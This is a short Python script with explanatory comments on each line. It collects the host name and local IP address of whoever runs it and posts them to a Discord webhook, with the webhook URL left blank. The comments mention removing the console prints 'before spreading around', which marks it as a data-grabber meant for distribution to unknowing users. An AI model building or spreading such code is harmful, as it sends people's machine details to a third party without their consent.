import socket # Import is used to get the host name and ip of the user that runs the application

host_name = socket.gethostname() # Here the host_name is used as a variable type so that who ever programmed this didn't have to type socket.gethostname() everytime.
ip_addr = socket.gethostbyname(host_name) # Here the ip_addr is used as a variable type so that who ever programmed this didn't have to type socket.gethostbyname(host_name) everytime.
print("Host name: ", host_name) # This prints into the console the person the users host name and would of course be removed before spreading around.
print("IP Addr: ", ip_addr) # This prints into the console the person the users host name and would of course be removed before spreading around.

from discord_webhook import DiscordWebhook, DiscordEmbed # Here they use a python package called discord-webhook that allows you to make embeds and send information to a webhook this can be used for both good and bad.
content = "" # Content this isn't really needed as all it would do is send a normal discord message above the embed.
webhook = DiscordWebhook(url="", username="", content=content) # Here a URL for the webhook would be inserted and a username that you would like to using for the webhook.
embed = DiscordEmbed(title="💻Host Name: " + host_name + " | IP: " + ip_addr, color="03b2f8") # This includes a few things the title is set to display the host name and ip of whoever runs the application and it also sets the color of the embed.
embed.set_footer(text="") # This is just a basic footer nothing would be inserted here and thus rendering this line useless.
webhook.add_embed(embed) # This line would add the embed to the webhook.
response = webhook.execute() # This line sets the response to the above and thsu sends all of the embed and content information.